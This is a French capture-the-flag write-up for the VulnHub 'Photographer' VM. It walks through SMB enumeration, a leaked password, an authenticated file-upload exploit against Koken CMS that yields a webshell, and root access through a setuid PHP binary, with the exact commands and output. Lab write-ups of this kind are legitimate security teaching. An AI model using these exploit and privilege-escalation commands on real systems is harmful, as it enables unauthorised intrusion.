# Solution du CTF Photographer de VulnHub

[Photographer](https://vulnhub.com/entry/photographer-1,519/) est un boot2root créé par [v1n1v131r4](https://twitter.com/@v1n1v131r4) et téléchargeable sur VulnHub.

```
Nmap scan report for 192.168.242.128
Host is up (0.00053s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
MAC Address: 00:0C:29:27:57:E7 (VMware)
Service Info: Hosts: PHOTOGRAPHER, example.com

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 2h53m12s, median: 59m59s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-11-19T21:53:38
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2022-11-19T16:53:37-05:00
```

## Talkie Talkie

On peut récupérer quelques partages via smbclient :

```shellsession
$ smbclient -U "" -N -L //192.168.242.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Il y a deux fichiers que l'on peut récupérer :

```shellsession
smbclient -U "" -N //192.168.242.128/sambashare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 03:30:07 2020
  ..                                  D        0  Tue Jul 21 11:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 03:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
```

Le premier est un mail d'un certain `Agi` pour `Daisa` :

```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

Le second est une archive de Wordpress mais il n'y a pas le `wp-config.php` dedans.

## Patting myself on the back

Sur le port 8000 je trouve le CMS *Koken*, une appli web déjà croisée sur [le CTF The Office: Doomsday Device de VulnHub](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20The%20Office%3A%20Doomsday%20Device%20de%20VulnHub.md#kitty-cat). Il semble s'agir du site de Daisa Ahomi.

Le site fait mention d'un fichier *shell.php* qui a du être uploadé comme si c'était une image. L'URL du fichier est facile à obtenir mais la page retourne le message suivant :

> WARNING: Failed to daemonise. This is quite common and not fatal. Network is unreachable (101)

Après recherche le fichier utilisé semble être [pentestmonkey/php-reverse-shell · GitHub](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Ce script se base sur une adresse IP et un port hardcodé donc on ne peut rien faire avec.

Juste à l'intuition je trouve que l'interface admin du Koken est à l'adresse `/admin` et qu'on peut se connecter avec les identifiants `daisa@photographer.com` / `babygirl`.

Petite auto-tape dans le dos puisque sur le précédent CTF j'avais codé un exploit pour la faille d'upload arbitraire sur le *Koken* du coup ici je n'ai qu'à exécuter :

```shellsession
$ python3 koken_exploit.py http://192.168.242.128:8000/ daisa@photographer.com babygirl
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
-- devloop.users.sf.net 2022 --
Successfully authenticated as daisa ahomi
Enjoy your shell at http://192.168.242.128:8000//storage/originals/f6/70/eubfyyiektheoqhlbobx.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je rappatrie un reverse-ssh sur la VM. Le firewall semble filtrer des ports sortants mais ça fonctionne avec le port 80 (et sinon, les ports entrants de la VM ne sont pas filtrés).

Dans le dossier personnel de `daisa` se trouve le premier flag :

```shellsession
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```

L'exécutable php est setuid root sur le système :

`-rwsr-xr-x 1 root root 4883680 Jul  9  2020 /usr/bin/php7.2`

L'exécutable donne bien l'effective UID 0 du moment qu'on reste dans PHP :

```shellsession
$ php -r "print(posix_getuid(). ' '. posix_geteuid());"
33 0
```

Si on exécute autre chose, c'est droppé :

```shellsession
$ php -r "system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Pour ça il faut explicitement écraser l'UID et le GID :

```shellsession
$ php -r "posix_setuid(0); posix_setgid(0); system('dash -i');"
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
proof.txt
# cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
```

*Publié le 19 novembre 2022*
